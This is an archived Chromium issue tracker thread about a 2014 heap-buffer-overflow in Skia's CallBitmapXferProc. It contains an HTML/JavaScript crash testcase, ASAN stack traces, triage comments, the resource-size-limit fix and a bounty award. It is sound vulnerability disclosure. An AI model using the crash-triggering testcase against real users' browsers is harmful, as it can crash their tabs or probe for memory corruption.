# Security: ASAN "heap-buffer-overflow" in CallBitmapXferProc

| Field | Value |
|-------|-------|
| **Issue ID** | [40078757](https://issues.chromium.org/issues/40078757) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | cl...@gmail.com |
| **Assignee** | en...@chromium.org |
| **Created** | 2014-01-24 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build.

**VERSION**  

Chrome Version: asan-symbolized-linux-release-246455  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
try{o0=tmp = document.createElement('iframe');;}catch(e){}
try{document.getElementById('store\_div').appendChild(tmp);}catch(e){}
try{o185=o0.contentDocument.documentElement;}catch(e){}
try{o186=o185;}catch(e){}
try{o186.insertAdjacentHTML('beforeend','<center style="color-rendering;-webkit-box-reflect: below; -webkit-logical-width: 16777218vh; -webkit-backface-visibility: hidden"><fieldset>:-<center style="-webkit-aspect-ratio;padding: 3vmax">x')}catch(e){}
}
</script>
<body onload='start()'><div id='store\_div'></div></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: ASAN output attached

## Attachments

- [crash.html](attachments/crash.html) (text/html, 559 B)
- [stack.txt](attachments/stack.txt) (text/plain, 8.6 KB)

## Timeline

### cl...@chromium.org (2014-01-24)

ClusterFuzz is analyzing your testcase. See https://cluster-fuzz.appspot.com/testcase?key=5552166672531456.

- Your friendly ClusterFuzz

### me...@chromium.org (2014-01-25)

Can't reproduce locally or on Clusterfuzz. Closing as WontFix for now.

### in...@chromium.org (2014-01-25)

Cloudfuzzer@, can you please try with latest trunk build and see if this reproduces for you. Are there any special flags or anything you are passing to asanified chrome.

### cl...@gmail.com (2014-01-25)

Sorry, did attach the testcase again instead of the ASAN output. See ASAN attached now.

The testcase only seems to trigger when running in an X vnc server (Xvnc4).

I will have a look at triggering it without the vnc server.

### in...@chromium.org (2014-01-25)

Mike, any idea what might have regressed this.

==32421==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ffe4616de40 at pc 0x7ffe5e9c981a bp 0x7ffe47cf44e0 sp 0x7ffe47cf44d8
WRITE of size 16 at 0x7ffe4616de40 thread T7 (Compositor)
    #0 0x7ffe5e9c9819 in sk_memset32_SSE2 ../../third_party/skia/src/opts/SkUtils_opts_SSE2.cpp:71
    #1 0x7ffe5e6650ce in CallBitmapXferProc ../../third_party/skia/src/core/SkDraw.cpp:259
    #2 0x7ffe5e66479a in drawPaint ../../third_party/skia/src/core/SkDraw.cpp:293
    #3 0x7ffe5e655596 in internalDrawPaint ../../third_party/skia/src/core/SkCanvas.cpp:1578
    #4 0x7ffe5e65ae5e in drawColor ../../third_party/skia/src/core/SkCanvas.cpp:2057
    #5 0x7ffe5f11f597 in DrawRenderPass ../../cc/output/direct_renderer.cc:368
    #6 0x7ffe5f11ea31 in DrawFrame ../../cc/output/direct_renderer.cc:232
    #7 0x7ffe5eeef2af in DrawLayers ../../cc/trees/layer_tree_host_impl.cc:1407
    #8 0x7ffe5ef514fd in DrawSwapReadbackInternal ../../cc/trees/thread_proxy.cc:1144
    #9 0x7ffe5ef53376 in ScheduledActionDrawAndSwapIfPossible ../../cc/trees/thread_proxy.cc:1268
    #10 0x7ffe5f0d7986 in DrawAndSwapIfPossible ../../cc/scheduler/scheduler.cc:302
    #11 0x7ffe5f0d41cc in ProcessScheduledActions ../../cc/scheduler/scheduler.cc:350
    #12 0x7ffe5f0d751a in OnBeginImplFrameDeadline ../../cc/scheduler/scheduler.cc:278
    #13 0x7ffe5f0d8f87 in MakeItSo ../../base/bind_internal.h:882

### in...@chromium.org (2014-01-25)

This could be the same as https://code.google.com/p/chromium/issues/detail?id=337512 which is crashing in SkSrcXfermode::xfer32 all the place. This is some very recent regression. We could not get a CF regression range since https://crbug.com/chromium/337512 is using custom media build.

### cl...@chromium.org (2014-01-28)

[Empty comment from Monorail migration]

### [Deleted User] (2014-01-28)

What is the current status of this? Have we been able to reproduce it?

### cl...@chromium.org (2014-01-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-01-31)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-02)

[Empty comment from Monorail migration]

### [Deleted User] (2014-02-03)

Ping, can someone please take a look at this. Are we able to reproduce it?

cloudfuzzer, have you been able to come up with a repro that does not require X vnc?

Does it still trigger for you?



### [Deleted User] (2014-02-03)

The code for drawColor is very old. Seems possible that the change is related to upstack code (e.g. direct_renderer.cc or layer_tree_host_impl.cc)? The code-path that is crashing is just computing an address from the canvas' bitmap' pixels. If that is out-of-bounds, perhaps the original allocation is stale?

### cl...@chromium.org (2014-02-04)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-11)

[Empty comment from Monorail migration]

### jl...@chromium.org (2014-02-12)

This does still reproduce on tip for me.

enne@: can you please either look at it or assign to someone?

==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7fa9e6528ec0 at pc 0x7faa4167a710 bp 0x7fa9e8aef410 sp 0x7fa9e8aef408
WRITE of size 16 at 0x7fa9e6528ec0 thread T7 (Compositor)
    #0 0x7faa4167a70f in _Z16sk_memset32_SSE2Pjji /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/opts/SkUtils_opts_SSE2.cpp:60
    #1 0x7faa4036cfe5 in _ZL22D32_Src_BitmapXferProcPvmj /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/core/SkDraw.cpp:154
    #2 0x7faa4032dc15 in _ZL18CallBitmapXferProcRK8SkBitmapRK7SkIRectPFvPvmjEj /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/core/SkDraw.cpp:259
    #3 0x7faa4032b48a in _ZNK6SkDraw9drawPaintERK7SkPaint /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/core/SkDraw.cpp:293
    #4 0x7faa4006fe23 in _ZN14SkBitmapDevice9drawPaintERK6SkDrawRK7SkPaint /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/core/SkBitmapDevice.cpp:208
    #5 0x7faa4025c9e9 in _ZN8SkCanvas17internalDrawPaintERK7SkPaint /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/core/SkCanvas.cpp:1610
    #6 0x7faa4025c57b in _ZN8SkCanvas9drawPaintERK7SkPaint /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/core/SkCanvas.cpp:1601
    #7 0x7faa4026bd96 in _ZN8SkCanvas9drawColorEjN10SkXfermode4ModeE /home/julien/sources/chrome/src/out/Debug/../../third_party/skia/src/core/SkCanvas.cpp:2101
    #8 0x7faa300129b2 in _ZN2cc16SoftwareRenderer11ClearCanvasEj /home/julien/sources/chrome/src/out/Debug/../../cc/output/software_renderer.cc:193
    #9 0x7faa30013072 in _ZN2cc16SoftwareRenderer16ClearFramebufferEPNS_14DirectRenderer12DrawingFrameEb /home/julien/sources/chrome/src/out/Debug/../../cc/output/software_renderer.cc:204
    #10 0x7faa2fdd2b3d in _ZN2cc14DirectRenderer14DrawRenderPassEPNS0_12DrawingFrameEPKNS_10RenderPassEb /home/julien/sources/chrome/src/out/Debug/../../cc/output/direct_renderer.cc:369
    #11 0x7faa2fdd00ab in _ZN2cc14DirectRenderer9DrawFrameEPNS_15ScopedPtrVectorINS_10RenderPassEEEPNS_15ContextProviderEfRKN3gfx4RectESA_bb /home/julien/sources/chrome/src/out/Debug/../../cc/output/direct_renderer.cc:232
    #12 0x7faa30b460d3 in _ZN2cc17LayerTreeHostImpl10DrawLayersEPNS0_9FrameDataEN4base9TimeTicksE /home/julien/sources/chrome/src/out/Debug/../../cc/trees/layer_tree_host_impl.cc:1418
    #13 0x7faa30d2419a in _ZN2cc11ThreadProxy24DrawSwapReadbackInternalEbbb /home/julien/sources/chrome/src/out/Debug/../../cc/trees/thread_proxy.cc:1187
    #14 0x7faa30d2a3bc in _ZN2cc11ThreadProxy36ScheduledActionDrawAndSwapIfPossibleEv /home/julien/sources/chrome/src/out/Debug/../../cc/trees/thread_proxy.cc:1325
    #15 0x7faa30d2a6dd in _ZThn40_N2cc11ThreadProxy36ScheduledActionDrawAndSwapIfPossibleEv /home/julien/sources/chrome/src/out/Debug/../../cc/trees/thread_proxy.cc:1327
    #16 0x7faa30882683 in _ZN2cc9Scheduler21DrawAndSwapIfPossibleEv /home/julien/sources/chrome/src/out/Debug/../../cc/scheduler/scheduler.cc:301
    #17 0x7faa30877fdc in _ZN2cc9Scheduler23ProcessScheduledActionsEv /home/julien/sources/chrome/src/out/Debug/../../cc/scheduler/scheduler.cc:349
    #18 0x7faa30881c9c in _ZN2cc9Scheduler24OnBeginImplFrameDeadlineEv /home/julien/sources/chrome/src/out/Debug/../../cc/scheduler/scheduler.cc:284
    #19 0x7faa3088af0a in _ZN4base8internal15RunnableAdapterIMN2cc9SchedulerEFvvEE3RunEPS3_ /home/julien/sources/chrome/src/out/Debug/../../base/bind_internal.h:134
    #20 0x7faa3088cce2 in _ZN4base8internal12InvokeHelperILb1EvNS0_15RunnableAdapterIMN2cc9SchedulerEFvvEEEFvRKNS_7WeakPtrIS4_EEEE8MakeItSoES7_SB_ /home/julien/sources/chrome/src/out/Debug/../../base/bind_internal.h:882
    #21 0x7faa3088c8c6 in _ZN4base8internal7InvokerILi1ENS0_9BindStateINS0_15RunnableAdapterIMN2cc9SchedulerEFvvEEEFvPS5_EFvNS_7WeakPtrIS5_EEEEESA_E3RunEPNS0_13BindStateBaseE /home/julien/sources/chrome/src/out/Debug/../../base/bind_internal.h:1166
    #22 0x7faa2faef668 in _ZNK4base8CallbackIFvvEE3RunEv /home/julien/sources/chrome/src/out/Debug/../../base/callback.h:401
    #23 0x7faa2ff8fb53 in _ZN4base18CancelableCallbackIFvvEE7ForwardEv /home/julien/sources/chrome/src/out/Debug/../../base/cancelable_callback.h:106
    #24 0x7faa2ff91dda in _ZN4base8internal15RunnableAdapterIMNS_18CancelableCallbackIFvvEEEFvvEE3RunEPS4_ /home/julien/sources/chrome/src/out/Debug/../../base/bind_internal.h:134
    #25 0x7faa2ff91752 in _ZN4base8internal12InvokeHelperILb1EvNS0_15RunnableAdapterIMNS_18CancelableCallbackIFvvEEEFvvEEEFvRKNS_7WeakPtrIS5_EEEE8MakeItSoES8_SC_ /home/julien/sources/chrome/src/out/Debug/../../base/bind_internal.h:882
    #26 0x7faa2ff91336 in _ZN4base8internal7InvokerILi1ENS0_9BindStateINS0_15RunnableAdapterIMNS_18CancelableCallbackIFvvEEEFvvEEEFvPS6_EFvNS_7WeakPtrIS6_EEEEESB_E3RunEPNS0_13BindStateBaseE /home/julien/sources/chrome/src/out/Debug/../../base/bind_internal.h:1166
    #27 0x7faa3d141328 in _ZNK4base8CallbackIFvvEE3RunEv /home/julien/sources/chrome/src/out/Debug/../../base/callback.h:401
    #28 0x7faa3d7069de in _ZN4base11MessageLoop7RunTaskERKNS_11PendingTaskE /home/julien/sources/chrome/src/out/Debug/../../base/message_loop/message_loop.cc:447
    #29 0x7faa3d70884a in _ZN4base11MessageLoop21DeferOrRunPendingTaskERKNS_11PendingTaskE /home/julien/sources/chrome/src/out/Debug/../../base/message_loop/message_loop.cc:459
    #30 0x7faa3d709490 in _ZN4base11MessageLoop6DoWorkEv /home/julien/sources/chrome/src/out/Debug/../../base/message_loop/message_loop.cc:573
    #31 0x7faa3d78c8bb in _ZN4base18MessagePumpDefault3RunEPNS_11MessagePump8DelegateE /home/julien/sources/chrome/src/out/Debug/../../base/message_loop/message_pump_default.cc:32
    #32 0x7faa3d704a79 in _ZN4base11MessageLoop10RunHandlerEv /home/julien/sources/chrome/src/out/Debug/../../base/message_loop/message_loop.cc:397
    #33 0x7faa3da7aaeb in _ZN4base7RunLoop3RunEv /home/julien/sources/chrome/src/out/Debug/../../base/run_loop.cc:49
    #34 0x7faa3d701eaa in _ZN4base11MessageLoop3RunEv /home/julien/sources/chrome/src/out/Debug/../../base/message_loop/message_loop.cc:290


0x7fa9e6528ec0 is located 0 bytes to the right of 671086272-byte region [0x7fa9be529800,0x7fa9e6528ec0)
allocated by thread T7 (Compositor) here:
    #0 0x7faa4a7d0b31 in operator new[] _asan_rtl_
    #1 0x7faa304ba9c1 in _ZN2cc16ResourceProvider12CreateBitmapERKN3gfx4SizeEi /home/julien/sources/chrome/src/out/Debug/../../cc/resources/resource_provider.cc:471
    #2 0x7faa304b8d6d in _ZN2cc16ResourceProvider14CreateResourceERKN3gfx4SizeEiNS0_16TextureUsageHintENS_14ResourceFormatE /home/julien/sources/chrome/src/out/Debug/../../cc/resources/resource_provider.cc:398
    #3 0x7faa305d9039 in _ZN2cc14ScopedResource8AllocateERKN3gfx4SizeENS_16ResourceProvider16TextureUsageHintENS_14ResourceFormatE /home/julien/sources/chrome/src/out/Debug/../../cc/resources/scoped_resource.cc:25
    #4 0x7faa2fdd3d6c in _ZN2cc14DirectRenderer13UseRenderPassEPNS0_12DrawingFrameEPKNS_10RenderPassE /home/julien/sources/chrome/src/out/Debug/../../cc/output/direct_renderer.cc:413
    #5 0x7faa2fdd1784 in _ZN2cc14DirectRenderer14DrawRenderPassEPNS0_12DrawingFrameEPKNS_10RenderPassEb /home/julien/sources/chrome/src/out/Debug/../../cc/output/direct_renderer.cc:336
    #6 0x7faa2fdd00ab in _ZN2cc14DirectRenderer9DrawFrameEPNS_15ScopedPtrVectorINS_10RenderPassEEEPNS_15ContextProviderEfRKN3gfx4RectESA_bb /home/julien/sources/chrome/src/out/Debug/../../cc/output/direct_renderer.cc:232
    #7 0x7faa30b460d3 in _ZN2cc17LayerTreeHostImpl10DrawLayersEPNS0_9FrameDataEN4base9TimeTicksE /home/julien/sources/chrome/src/out/Debug/../../cc/trees/layer_tree_host_impl.cc:1418
    #8 0x7faa30d2419a in _ZN2cc11ThreadProxy24DrawSwapReadbackInternalEbbb /home/julien/sources/chrome/src/out/Debug/../../cc/trees/thread_proxy.cc:1187
    #9 0x7faa30d2a3bc in _ZN2cc11ThreadProxy36ScheduledActionDrawAndSwapIfPossibleEv /home/julien/sources/chrome/src/out/Debug/../../cc/trees/thread_proxy.cc:1325
    #10 0x7faa30d2a6dd in _ZThn40_N2cc11ThreadProxy36ScheduledActionDrawAndSwapIfPossibleEv /home/julien/sources/chrome/src/out/Debug/../../cc/trees/thread_proxy.cc:1327
    #11 0x7faa30882683 in _ZN2cc9Scheduler21DrawAndSwapIfPossibleEv /home/julien/sources/chrome/src/out/Debug/../../cc/scheduler/scheduler.cc:301
    #12 0x7faa30877fdc in _ZN2cc9Scheduler23ProcessScheduledActionsEv /home/julien/sources/chrome/src/out/Debug/../../cc/scheduler/scheduler.cc:349
    #13 0x7faa30881c9c in _ZN2cc9Scheduler24OnBeginImplFrameDeadlineEv /home/julien/sources/chrome/src/out/Debug/../../cc/scheduler/scheduler.cc:284

### cl...@chromium.org (2014-02-12)

ClusterFuzz is analyzing your testcase. See https://cluster-fuzz.appspot.com/testcase?key=5309068436570112

### cl...@chromium.org (2014-02-12)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-12)

[Empty comment from Monorail migration]

### ja...@chromium.org (2014-02-12)

@jln - how are you reproing locally?  I think if we had stacks with parameters it'd be relatively easy to see what was going on, but just the stacks by themselves aren't as useful.

### en...@chromium.org (2014-02-12)

This is generating a render pass of size 16777218 * 76 (and then multiplying that by 4 to get bytes to allocate).  The allocator seems to return something real, but ASAN isn't happy.  Maybe ASAN isn't good at handling allocations larger than 2^32.  :P

That said, maybe we shouldn't bother with a 5GB render pass bitmap here. The hardware renderer is limited by texture size, so is usually like 8k x 8k at most.  I'll just make the software renderer obey that too.

### bu...@chromium.org (2014-02-13)

------------------------------------------------------------------------
r250870 | enne@chromium.org | 2014-02-13T00:45:02.317414Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/cc/resources/resource_provider.cc?r1=250870&r2=250869&pathrev=250870

cc: Limit software resource sizes

Althought the software renderer *could* support much larger sizes than
the hardware renderer, there's no reason to allow them.  This will
create a little bit more consistency between platforms and will prevent
security issues caused by gigantic allocations.

BUG=337882

Review URL: https://codereview.chromium.org/137703014
------------------------------------------------------------------------

### in...@chromium.org (2014-02-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-13)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

Your fix is very close to the branch point. After the branch happens, please make sure to check if your fix is in.

- Your friendly ClusterFuzz

### en...@chromium.org (2014-02-18)

[Empty comment from Monorail migration]

### la...@google.com (2014-02-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2014-02-19)

------------------------------------------------------------------------
r251884 | enne@chromium.org | 2014-02-19T00:01:05.503447Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1750/src/cc/resources/resource_provider.cc?r1=251884&r2=251883&pathrev=251884

Merge 250870 "cc: Limit software resource sizes"

> cc: Limit software resource sizes
> 
> Althought the software renderer *could* support much larger sizes than
> the hardware renderer, there's no reason to allow them.  This will
> create a little bit more consistency between platforms and will prevent
> security issues caused by gigantic allocations.
> 
> BUG=337882
> 
> Review URL: https://codereview.chromium.org/137703014

TBR=enne@chromium.org

Review URL: https://codereview.chromium.org/166323003
------------------------------------------------------------------------

### dh...@google.com (2014-02-19)

[Empty comment from Monorail migration]

### dh...@google.com (2014-02-19)

This was merged after the stable build was cut. Hence moving the label to Release-1-M33

### en...@chromium.org (2014-02-21)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-02-21)

[Empty comment from Monorail migration]

### mb...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### dh...@google.com (2014-02-28)

[Empty comment from Monorail migration]

### mb...@chromium.org (2014-03-04)

Thanks for the report! This one qualifies for a $2000 reward.

### ti...@chromium.org (2014-04-15)

Starting payment process.

### ti...@chromium.org (2014-04-18)

Processing via our e-payment system can take a few weeks, but reward should be on its way to you (Req #233621). Thanks again for your help!

### cl...@chromium.org (2014-05-22)

Bulk update: removing view restriction from closed bugs.

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/337882?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/337512]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078757)*
